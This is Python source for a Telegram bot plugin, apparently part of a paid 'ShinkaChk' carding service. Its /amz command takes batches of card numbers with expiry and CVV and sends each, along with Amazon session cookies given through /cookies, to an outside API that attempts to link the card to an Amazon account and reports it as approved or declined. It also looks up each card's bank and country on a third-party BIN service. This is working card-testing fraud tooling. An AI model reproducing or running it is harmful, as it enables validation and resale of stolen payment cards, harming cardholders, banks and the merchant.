from pyrogram import Client, filters
from plugins.utility.db import get_user_rank, is_user_authorized, OWNER_ID, is_user_registered
from plugins.utility.antispam import is_spamming
from plugins.utility.binreq import bin_data
from plugins.utility.banbin import is_bin_banned
from luhn import luhn_verification
from commands_status import get_command_status
import re, time, aiohttp, logging

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

API_URL = "https://apis-dpchk.alwaysdata.net/apis/new/Amazon.php"
API_KEY = None
data = {"cookies": ""}  # Store cookies globally

# Diccionario REGION_MAP para detectar región desde cookies
REGION_MAP = {
    "acbmx": "MX",  # México
    "main": "US",   # Estados Unidos
    "acbca": "CA",  # Canadá
    "acbbr": "BR",  # Brasil
    "acbit": "IT",  # Italia
    "acbes": "ES",  # España
    "acbde": "DE",  # Alemania
    "acbpl": "PL",  # Polonia
    "acbfr": "FR",  # Francia
    "acbnl": "NL",  # Países Bajos
    "acbuk": "UK",  # Reino Unido
    "acbtr": "TR",  # Turquía
    "acbae": "AE",  # Emiratos Árabes Unidos
    "acbsg": "SG",  # Singapur
    "acbsa": "SA",  # Arabia Saudita
    "acbau": "AU",  # Australia
    "acbjpn": "JP", # Japón
    "acbin": "IN"   # India
}

def detect_region(cookies):
    if not cookies:
        return None
    for code, region in REGION_MAP.items():
        if code.lower() in cookies.lower():
            return region
    return None

async def get_bin_info(bin_number, retries=3, delay=2):
    """Obtiene información del BIN de forma asíncrona con reintentos."""
    async with aiohttp.ClientSession() as session:
        for attempt in range(retries):
            try:
                async with session.get(f'https://chellyx.shop/dados/binsearch.php?bin={bin_number}', timeout=15) as response:
                    response.raise_for_status()
                    bin_info = await response.text()

                    if not bin_info or "not found" in bin_info.lower():
                        logger.warning(f"BIN {bin_number} no encontrado")
                        return 'No disponible', 'No disponible', 'No disponible', 'No disponible', 'No disponible', '🏳️'

                    fields = bin_info.strip().split()
                    if len(fields) < 5:
                        logger.warning(f"Formato de BIN inválido para {bin_number}: {bin_info}")
                        return 'No disponible', 'No disponible', 'No disponible', 'No disponible', 'No disponible', '🏳️'

                    brand = fields[0]
                    country_idx = fields.index(fields[-2])
                    bank = " ".join(fields[1:country_idx])
                    level = fields[-3]
                    country = fields[-2]
                    ctype = fields[-1]

                    return brand, ctype, level, bank, country, '🏳️'

            except aiohttp.ClientError as e:
                logger.error(f"Intento {attempt + 1}/{retries} fallido para BIN {bin_number}: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"Error en búsqueda de BIN {bin_number} tras {retries} intentos: {e}")
                    return 'No disponible', 'No disponible', 'No disponible', 'No disponible', 'No disponible', '🏳️'

async def check_card(card, cookies):
    try:
        if not re.match(r"^[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}$", card):
            return "🟠 Error", "Formato de tarjeta inválido", "🔴 No removido"
        headers = {}
        if API_KEY:
            headers['X-API-Key'] = API_KEY
        payload = {
            'lista': card,
            'cookies': cookies
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(API_URL, data=payload, headers=headers, timeout=180) as response:
                response.raise_for_status()
                response_text = await response.text()

        if "Coloque os cookies de amazon.com.mx" in response_text:
            return "🔴 Cookies Inválidas", "Usa /cookies para agregar cookies válidas.", "🔴 No removido"

        status_match = re.search(r'<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)</span>', response_text)
        message_match = re.search(r'<span class="text-(success|danger)">(.+?)</span>\s*➔\s*Tempo de resposta', response_text, re.DOTALL)
        removed_match = re.search(r'Removido: (✅|❌)', response_text)

        status = "🟠 Error"
        response_msg = "Reintenta más tarde"
        removed_status = "🔴 No removido"

        if status_match:
            status_raw = status_match.group(2)
            if status_raw == "Aprovada":
                status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                response_msg = "Cartão vinculado com sucesso" if not message_match else re.sub(r'.*?➔\s*', '', message_match.group(2)).strip()
            elif status_raw == "Reprovada":
                status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                response_msg = "Tarjeta mala, no insistir" if not message_match else re.sub(r'.*?➔\s*', '', message_match.group(2)).strip()
            elif status_raw == "Erros":
                status = "🟠 Error"
                response_msg = "Error desconocido" if not message_match else re.sub(r'.*?➔\s*', '', message_match.group(2)).strip()

        if "Cookies não detectado" in response_text:
            status = "🔴 Cookies Inválidas"
            response_msg = "Cookie inválida, usa /cookies para cambiarla"
        elif "Erro ao obter acesso passkey" in response_text:
            status = "🔴 Cookies Inválidas"
            response_msg = "Cierra e inicia sesión en tu cuenta de nuevo"
        elif "Um endereço foi cadatrado" in response_text:
            status = "🟠 Dirección Requerida"
            response_msg = "Agrega una dirección a la cuenta"
        elif "Erro interno - Amazon API" in response_text:
            status = "🔴 Reprobada"
            response_msg = "Respuesta Desconocida"
        elif "Lista inválida" in response_text:
            status = "🟠 Error"
            response_msg = "Formato de tarjeta inválido"
        elif "Erro ao obter cartão vinculado." in response_text:
            status = "🔴 Cookies Inválidas O Verifica cuenta"
            response_msg = "Cookie inválida, usa /cookies o verifica la cuenta"

        if removed_match:
            removed_status = "🟢 Removido" if removed_match.group(1) == "✅" else "🔴 No removido"

        return status, response_msg, removed_status
    except aiohttp.ClientError as e:
        return "🟠 Error", f"Error en solicitud a API: {str(e)}", "🔴 No removido"
    except Exception as e:
        return "🟠 Error", f"Reintenta más tarde: {str(e)}", "🔴 No removido"

@Client.on_message(filters.command("cookies", prefixes=["/", "."]))
async def save_cookies(client, message):
    user_id = message.from_user.id
    first_n = message.from_user.first_name
    mid = message.id

    if get_command_status('cookies') == 'off':
        await message.reply_text("Command is on maintenance, come back later.", reply_to_message_id=mid)
        return
    if not await is_user_registered(user_id):
        await message.reply_text("𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 /register 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.", reply_to_message_id=mid)
        return
    
    is_authorized = await is_user_authorized(user_id)
    if not is_authorized:
        txt = f'''
𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.
━━━━━━━━━━━━
𝗜𝗳 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗯𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝘂𝘀𝗲 '/buy' 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗱𝗲𝘁𝗮𝗶𝗹𝘀.
'''
        await message.reply_text(txt, reply_to_message_id=mid)
        return
    if user_id != OWNER_ID:
        is_spam, spam_message = is_spamming(user_id, is_authorized)
        if is_spam:
            await message.reply_text(spam_message, reply_to_message_id=mid)
            return
    
    cookies = " ".join(message.command[1:]).strip()
    if not cookies:
        await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗼𝗼𝗸𝗶𝗲𝘀
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> �_U𝘀𝗮: <code>/cookies &lt;cookies&gt;</code>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
        return
    
    region = detect_region(cookies)
    data["cookies"] = cookies
    region_text = region or "GLOBAL"
    await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗼𝗼𝗸𝗶𝗲𝘀
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗦𝘁𝗮𝘁𝘂𝘀: Cookies almacenadas para AMAZON {region_text}.
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)

@Client.on_message(filters.command("amz", prefixes=["/", "."]))
async def amz_command(client, message):
    user_id = message.from_user.id
    first_n = message.from_user.first_name
    mid = message.id

    if get_command_status('amz') == 'off':
        await message.reply_text("Gate is on maintenance, come back later.", reply_to_message_id=mid)
        return
    if not await is_user_registered(user_id):
        await message.reply_text("𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 /register 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.", reply_to_message_id=mid)
        return
    
    is_authorized = await is_user_authorized(user_id)
    if not is_authorized:
        txt = f'''
𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.
━━━━━━━━━━━━
𝗜𝗳 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗯𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝘂𝘀𝗲 '/buy' 𝗰𝗼𝗺𝗺𝗮�_n𝗱 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗱𝗲𝘁𝗮𝗶𝗹𝘀.
'''
        await message.reply_text(txt, reply_to_message_id=mid)
        return
    if user_id != OWNER_ID:
        is_spam, spam_message = is_spamming(user_id, is_authorized)
        if is_spam:
            await message.reply_text(spam_message, reply_to_message_id=mid)
            return
    
    if not data["cookies"]:
        await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗘𝗿𝗿𝗼𝗿: Usa <code>/cookies &lt;cookies&gt;</code> primero.
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
        return
    
    # Obtener tarjetas del mensaje
    ccc = None
    if len(message.text.split('amz ')) > 1 and message.text.split('amz ')[1].strip():
        ccc = message.text.split('amz ')[1].strip()
    elif message.reply_to_message:
        ccc = message.reply_to_message.text.strip()
        
    if not ccc:
        await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗘𝗿𝗿𝗼𝗿: Please enter card details.
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
        return
    
    # Dividir las tarjetas por líneas y limitar a 100
    cards = ccc.split('\n')[:100]
    if not cards:
        await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> �_A𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗘𝗿𝗿𝗼𝗿: No valid cards found.
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
        return
    
    # Enviar mensaje inicial indicando el número de tarjetas a procesar
    await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗦𝘁𝗮𝘁𝘂𝘀: Processing {len(cards)} card(s)...
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{await get_user_rank(user_id)}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)

    # Procesar cada tarjeta
    rank = await get_user_rank(user_id)
    for card in cards:
        card = re.sub(r'[ /\\:]', '|', card.strip())
        ff = re.findall(r'\b(\d{15,16})\|(\d{2})\|(\d{4}|\d{2})\|(\d{3,4})', card)
        
        if not ff:
            await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗘𝗿𝗿𝗼𝗿: Invalid format for card: <code>{card}</code>. Format: XXXXXXXXXXXXXXXX|MM|YYYY|CVV
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{rank}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> �_D𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
            continue
        
        f = ff[0]
        cc = f[0]
        if not luhn_verification(cc):
            await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗔𝗺𝗮𝘇𝗼𝗻 𝗖𝗵𝗸
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗘𝗿𝗿𝗼�_r: Invalid card number (Luhn check failed) for: <code>{card}</code>.
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{rank}]</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
            continue
        
        mm = f[1]
        yy = f[2]
        if len(yy) == 2:
            yy = '20' + yy
        cvv = f[3]
        cccc = cc + '|' + mm + '|' + yy + '|' + cvv
        is_ban = await is_bin_banned(cc[:6])
        if is_ban:
            await message.reply_text(f'''
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗕𝗶𝗻 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗦𝘆𝘀𝘁𝗲𝗺
━━━━━━━━━━━━
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: <code>{is_ban}</code>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
''', reply_to_message_id=mid, disable_web_page_preview=True)
            continue
        
        start_time = time.perf_counter()
        status, response_msg, removed_status = await check_card(cccc, data["cookies"])
        brand, type, level, bank, country, emoji = await get_bin_info(cc[:6])
        end_time = time.perf_counter()
        elapsed_time = f"{end_time - start_time:.2f}"
        text = f'''
<b>#Amazon 🔥 [/amz]
- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗖𝗮𝗿𝗱: <code>{cccc}</code>
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗦𝘁𝗮𝘁𝘂𝘀: {status}
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {response_msg}
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗥𝗲𝗺𝗼𝘃𝗲𝗱: {removed_status}
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗜𝗻𝗳𝗼: <b><code>{brand}</code> - <code>{type}</code> - <code>{level}</code></b>
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗕𝗮𝗻𝗸: <code>{bank}</code>
<b>[<a href="https://t.me/ShinkaChk">ϟ</a>]</b> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} - [<code>{emoji}</code>]
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⌥</a>]</b> 𝗧𝗶𝗺𝗲: <code>{elapsed_time}</code> 𝗦𝗲𝗰. || 𝗣𝗿𝗼𝘅𝘆: <b><code>Live ✅</code></b>
<b>[<a href="https://t.me/ShinkaChk">⎇</a>]</b> 𝗥𝗲𝗾 𝗕𝘆: <a href="tg://user?id={user_id}">{first_n}</a> <b>[{rank}]</b>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>[<a href="https://t.me/ShinkaChk">⌤</a>]</b> 𝗗𝗲𝘃 𝗯𝘆: <code>𝑺𝒉𝒊𝒏𝒌𝒂𝑪𝒉𝒌</code> 🍀
'''
        await message.reply_text(text, reply_to_message_id=mid, disable_web_page_preview=True)